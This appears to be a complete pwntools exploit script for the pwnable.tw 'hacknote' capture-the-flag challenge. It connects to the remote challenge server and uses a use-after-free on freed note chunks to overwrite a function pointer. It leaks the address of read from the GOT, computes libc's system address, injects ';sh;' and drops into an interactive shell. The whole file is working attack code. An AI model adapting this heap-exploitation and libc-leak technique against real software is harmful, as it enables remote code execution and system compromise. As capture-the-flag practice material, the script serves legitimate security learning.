#!/usr/bin/env python
import re
from pwn import *
import pwnlib.shellcraft
# import pwnlib.filepointer

c = remote('chall.pwnable.tw', 10102)
pwn_file="./ld-2.23.so --library-path ./ ./hacknote"
# c = process(pwn_file.split(), env={'LD_PRELOAD': './libc_32.so.6'})
libc = ELF('libc_32.so.6')
elf = ELF('./hacknote')

context.os='linux'
context.terminal = ['alacritty', '-e', 'sh', '-c']

gdbcmd = '''source /usr/share/peda/peda.py
file ./hacknote
# b *0x08048a85
b *0x804893d
c
telescope 0x804a050
telescope $edx-8 20
'''

# gdb.attach(c, gdbcmd)
context.log_level ='debug'

def send_menu(command):
    c.recvuntil(':')
    c.send(command)

# creat new chunk
def add_note():
    send_menu('1')
    send_menu('200')
    send_menu('1234567')

def remove_note(index):
    send_menu('2')
    send_menu(str(index))

add_note()
add_note()
add_note()
remove_note(0)
remove_note(1)
remove_note(2)

# add leak libc note
send_menu('1')
send_menu('8')
send_menu(p32(0x804862b) + p32(elf.got['read']))

send_menu('3')
send_menu('0')
libc_read = u32(c.recvn(4))
libc_base = libc_read - libc.symbols['read']
libc_system = libc_base + libc.symbols['system']
print(hex(libc_read))
print(hex(libc_base))

send_menu('1')
send_menu('200')
send_menu( b'C'*(200 - 8) + p32(libc_system) + b';sh;')

send_menu('3')
send_menu('1')

c.interactive()
c.close()

